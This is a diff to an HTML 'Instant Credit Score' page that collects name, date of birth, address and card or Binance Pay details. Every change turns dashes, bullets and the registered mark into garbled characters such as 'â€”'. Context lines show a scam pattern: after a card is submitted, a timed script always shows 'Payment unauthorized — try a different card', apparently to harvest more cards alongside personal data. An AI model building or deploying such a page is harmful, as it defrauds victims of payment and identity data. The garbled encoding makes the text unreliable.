@@ -5,7 +5,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Premium Credit Meter — Get Your Score</title>
+<title>Premium Credit Meter â€” Get Your Score</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Rubik:wght@400;600&display=swap" rel="stylesheet">
 <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
@@ -232,10 +232,10 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     <div class="card">
       <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
         <div class="site-name">INSTANT CREDIT SCORE</div>
-        <div class="muted">Secure • Instant</div>
+        <div class="muted">Secure â€¢ Instant</div>
       </div>
       <h1>Get Your Credit Report</h1>
-      <p class="lead">Premium instant access to a VantageScore estimate. Click to start — it's quick and secure.</p>
+      <p class="lead">Premium instant access to a VantageScore estimate. Click to start â€” it's quick and secure.</p>
       <div style="margin-top:18px">
         <button class="btn" onclick="gotoPage('page2')">GET MY SCORE</button>
       </div>
@@ -339,7 +339,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
         <div class="site-name">INSTANT CREDIT SCORE</div>
         <div class="muted">Step 3 of 4</div>
       </div>
-      <h2>Final Step — Payment & Consent</h2>
+      <h2>Final Step â€” Payment & Consent</h2>
 
       <div class="terms-box" style="margin-bottom:14px">
         <i class="fas fa-exclamation-triangle" style="color:#b30000"></i>
@@ -393,7 +393,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
           <button type="button" class="btn secondary" onclick="gotoPage('page3')">Back</button>
         </div>
 
-        <div id="cardError" style="display:none" class="error-box"><i class="fas fa-exclamation-triangle"></i><div id="cardErrorText">Payment unauthorized — try a different card or choose a different payment method.</div></div>
+        <div id="cardError" style="display:none" class="error-box"><i class="fas fa-exclamation-triangle"></i><div id="cardErrorText">Payment unauthorized â€” try a different card or choose a different payment method.</div></div>
       </div>
 
       <!-- BINANCE PAY (existing UI) -->
@@ -426,7 +426,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     <div class="gauge-wrap">
       <div class="gauge-top" style="width:100%">
         <div class="brand">Instant Credit Score</div>
-        <div class="small-badge">Secure • Instant</div>
+        <div class="small-badge">Secure â€¢ Instant</div>
       </div>
 
       <div class="gauge-stage">
@@ -538,7 +538,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
       </div>
 
       <div class="score-small" id="scoreSmall">695</div>
-      <div class="vantage-line" id="vantageLine">VantageScore® 3.0 based on TransUnion data as of <span id="scoreDate">—</span></div>
+      <div class="vantage-line" id="vantageLine">VantageScoreÂ® 3.0 based on TransUnion data as of <span id="scoreDate">â€”</span></div>
 
       <!-- Rating labels placed under the gauge -->
       <div class="rating-labels">
@@ -554,12 +554,12 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
       <div class="info-grid">
         <div class="info-col">
           <div class="info-label">Personal Info</div>
-          <div class="info-val" id="piName">—</div>
+          <div class="info-val" id="piName">â€”</div>
         </div>
 
         <div class="info-col">
           <div class="info-label">DOB</div>
-          <div class="info-val" id="piDOB">—</div>
+          <div class="info-val" id="piDOB">â€”</div>
         </div>
 
         <div class="info-col">
@@ -576,7 +576,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
 
         <div class="info-col" style="flex:1 1 100%">
           <div class="info-label">Address</div>
-          <div class="info-val" id="piAddress">—</div>
+          <div class="info-val" id="piAddress">â€”</div>
         </div>
       </div>
     </div>
@@ -810,7 +810,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     setTimeout(()=>{
       hideOverlay();
       // show unauthorized error message and stay on page4
-      document.getElementById('cardErrorText').textContent = 'Payment unauthorized — try a different card or choose a different payment method.';
+      document.getElementById('cardErrorText').textContent = 'Payment unauthorized â€” try a different card or choose a different payment method.';
       document.getElementById('cardError').style.display = 'flex';
     }, 7000);
   });
@@ -830,9 +830,9 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
 
       // set personal display
       const fullName = `${user.firstName || ''} ${user.lastName || ''}`.trim();
-      document.getElementById('piName').textContent = fullName || '—';
-      document.getElementById('piDOB').textContent = user.dob || '—';
-      document.getElementById('piAddress').textContent = `${user.address || ''}${user.city ? ', ' + user.city : ''}${user.zip ? ' ' + user.zip : ''}` || '—';
+      document.getElementById('piName').textContent = fullName || 'â€”';
+      document.getElementById('piDOB').textContent = user.dob || 'â€”';
+      document.getElementById('piAddress').textContent = `${user.address || ''}${user.city ? ', ' + user.city : ''}${user.zip ? ' ' + user.zip : ''}` || 'â€”';
 
       // draw gauge visuals
       drawGauge();
@@ -922,4 +922,5 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
 </script>
 
 </body>
+
 </html>
